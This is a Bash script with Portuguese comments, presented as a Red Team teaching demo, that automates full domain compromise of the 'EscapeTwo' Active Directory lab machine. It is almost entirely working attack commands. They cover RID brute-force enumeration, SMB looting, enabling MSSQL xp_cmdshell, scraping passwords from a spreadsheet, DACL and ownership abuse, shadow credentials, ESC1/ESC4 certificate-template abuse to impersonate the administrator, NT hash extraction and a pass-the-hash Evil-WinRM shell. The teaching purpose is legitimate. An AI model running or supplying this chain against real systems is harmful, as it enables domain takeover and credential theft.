#!/bin/bash

# EscapeTwo AUTO ROOT - Versão Profissional para Aulas e Demonstrações de Red Team 🚀
# Autor: @ai.marcostolosa | Aula: Red Team 

# ----------- CORES PARA SAÍDA -----------
RED="\033[1;31m"
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
NC="\033[0m"

# ----------- FUNÇÕES PARA LEGIBILIDADE -----------
step() {
    echo -e "${BLUE}[*] $1${NC}"
}

success() {
    echo -e "${GREEN}[+] $1${NC}"
}

error() {
    echo -e "${RED}[!] $1${NC}"
}

usage() {
    echo -e "${YELLOW}Modo de uso:${NC} $0 -i <IP> [-R]"
    echo "  -i, --ip       IP da máquina alvo"
    echo "  -R, --remove   Remove todos os arquivos e diretórios gerados"
    exit 1
}

# ----------- CONFIGURAÇÃO DE VARIÁVEIS -----------
IP=""
REMOVE=false
DOMAIN=""
TARGET=""
USER_ROSE=""
PASS_ROSE=""
USER_SQL=""
PASS_SQL=""
USER_RYAN=""
PASS_RYAN=""
CA_TEMPLATE=""
CA_NAME=""
CA_SVC=""

# ----------- PARÂMETROS DO SCRIPT -----------
while [[ $# -gt 0 ]]; do
    case $1 in
        -i|--ip)
            IP="$2"
            shift 2
            ;;
        -R|--remove)
            REMOVE=true
            shift
            ;;
        *)
            usage
            ;;
    esac
done

if $REMOVE; then
    step "Removendo arquivos e diretórios gerados..."
    rm -rf nmap_scan.txt rid_enum.txt ryan.txt ca_svc.pfx sql_enable.sql administrator.pfx *.key *.ccache extracted_excel smb_loot *.bak *.zip *.json *.txt __pycache__
    success "Todos os arquivos foram removidos!"
    exit 0
fi

if [[ -z "$IP" ]]; then
    usage
fi

# ----------- ETAPA 0: SINCRONIZAÇÃO DE HORA E AJUSTES DE DNS -----------
step "0. Preparação do ambiente: Sincronizando Data e Hora com o AD"
sudo ntpdate $IP

# Garante que TARGET está no /etc/hosts (para Kerberos funcionar corretamente)
grep -q "$TARGET" /etc/hosts || echo "$IP $TARGET" | sudo tee -a /etc/hosts

# ----------- ETAPA 1: SCAN COMPLETO PARA ENUMERAÇÃO INICIAL -----------
step "1. Full Nmap scan... 1500 top ports"
nmap -sV -Pn -T4 --top-ports 1500 -v -oN nmap_scan.txt $IP

# ----------- ETAPA 2: ENUMERAÇÃO DE USUÁRIOS COM RID BRUTE -----------
step "2. Enumerando usuários via RID brute"
crackmapexec smb $IP -u "$USER_ROSE" -p "$PASS_ROSE" --rid-brute | tee rid_enum.txt

# ----------- ETAPA 3: DOWNLOAD DE ARQUIVOS SMB -----------
step "3. Baixando arquivos SMB do Accounting Department"
mkdir -p smb_loot
smbclient "//$IP/Accounting Department" -U "$USER_ROSE%$PASS_ROSE" -c 'lcd smb_loot; recurse ON; prompt OFF; mget *'

# ----------- ETAPA 4: HABILITANDO xp_cmdshell NO MSSQL -----------
step "4. Executando comandos via MSSQL com xp_cmdshell"
echo "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;" > sql_enable.sql
echo "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;" >> sql_enable.sql
echo "EXEC xp_cmdshell 'whoami';" >> sql_enable.sql
impacket-mssqlclient "$DOMAIN/$USER_SQL:$PASS_SQL@$IP" -file sql_enable.sql

# ----------- ETAPA 5: EXTRAINDO DADOS E CREDENCIAIS DO accounts.xlsx -----------
step "5. Extraindo todas as credenciais de accounts.xlsx"

mkdir -p extracted_excel
unzip -o smb_loot/accounts.xlsx -d extracted_excel > /dev/null 2>&1

SHARED_STRINGS="extracted_excel/xl/sharedStrings.xml"

if [[ ! -f "$SHARED_STRINGS" ]]; then
    error "sharedStrings.xml não encontrado!"
    exit 1
fi

# Extrai os textos
VALUES=($(grep -oP '(?<=<t xml:space="preserve">).*?(?=</t>)' "$SHARED_STRINGS"))

# Validação mínima
TOTAL=${#VALUES[@]}
if [[ $TOTAL -lt 5 ]]; then
    error "sharedStrings.xml não contém dados suficientes."
    exit 1
fi

# Gera CSV
OUTPUT="sql_svc.txt"
echo "First Name,Last Name,Email,Username,Password" > $OUTPUT

for ((i=5; i<$TOTAL; i+=5)); do
    echo "${VALUES[$i]},${VALUES[$((i+1))]},${VALUES[$((i+2))]},${VALUES[$((i+3))]},${VALUES[$((i+4))]}" >> $OUTPUT
done

success "Credenciais extraídas com sucesso para $OUTPUT:"
cat $OUTPUT

# ----------- ETAPA 6: COLETANDO DADOS COM BLOODHOUND -----------
step "6. BloodHound com Ryan"
bloodhound-python -u $USER_RYAN -p "$PASS_RYAN" -d $DOMAIN -ns $IP -c All

# ----------- ETAPA 7: MODIFICANDO OWNER PARA RYAN (ESC4 - SHADOW CREDENTIALS) -----------
step "7. Mudando OWNER de ca_svc para Ryan com bloodyAD"
bloodyAD --host $IP -d $DOMAIN -u "$USER_RYAN" -p "$PASS_RYAN" set owner "$CA_SVC" "$USER_RYAN"

# ----------- ETAPA 8: CONCEDENDO FULLCONTROL COM DACLEDIT -----------
step "8. Grant FullControl para Ryan com impacket-dacledit"
impacket-dacledit -action write -rights FullControl -principal "$USER_RYAN" -target "$CA_SVC" "$DOMAIN/$USER_RYAN:$PASS_RYAN"

# ----------- ETAPA 9: EXECUTANDO SHADOW CREDENTIALS -----------
step "9. Executando Shadow Credentials com certipy-ad"
certipy-ad shadow auto -u "$USER_RYAN@$DOMAIN" -p "$PASS_RYAN" -account "$CA_SVC" -dc-ip $IP

if [[ ! -f "ca_svc.ccache" ]]; then
    error "Falha ao gerar ca_svc.ccache"
    exit 1
fi

# ----------- ETAPA 10: MODIFICANDO TEMPLATE PARA ABUSO ESC1 -----------
step "10. Modificando o template com ESC1"
KRB5CCNAME=./ca_svc.ccache certipy-ad template -k -template $CA_TEMPLATE -target $TARGET -dc-ip $IP

# ----------- ETAPA 11: REQUISIÇÃO DE CERTIFICADO DO ADMINISTRATOR -----------
step "11. Requisitando certificado do administrator com ESC4 (Kerberos)"
KRB5CCNAME=./ca_svc.ccache certipy-ad req -k \
  -ca $CA_NAME \
  -template $CA_TEMPLATE \
  -upn administrator@$DOMAIN \
  -subject "CN=administrator" \
  -target $TARGET \
  -dc-ip $IP

if [[ ! -f "administrator.pfx" ]]; then
    error "administrator.pfx não foi gerado. Abortando."
    exit 1
fi

# ----------- ETAPA 12: AUTENTICANDO COM CERTIFICADO E EXTRAINDO HASH -----------
step "12. Autenticando com o certificado para extrair hash NT"
AUTH=$(certipy-ad auth -pfx administrator.pfx -domain $DOMAIN -dc-ip $IP)
echo "$AUTH"

HASH_LINE=$(echo "$AUTH" | grep "Got hash")
HASH=$(echo "$HASH_LINE" | awk -F": " '{print $2}')
USER=$(echo "$HASH_LINE" | grep -oP "(?<=Got hash for ').*?(?=@)")

if [ -n "$HASH" ]; then
  echo -e "${GREEN}[+] $USER:$HASH${NC}"
else
  echo -e "${RED}[!] Falha ao extrair o NT hash do administrator.${NC}"
  exit 1
fi

success "Hash NT do administrator extraído: $HASH"

# ----------- ETAPA 13: ROOT COM EVIL-WINRM -----------
step "13. Conectando via Evil-WinRM"
evil-winrm -i $IP -u administrator -H "${HASH##*:}"
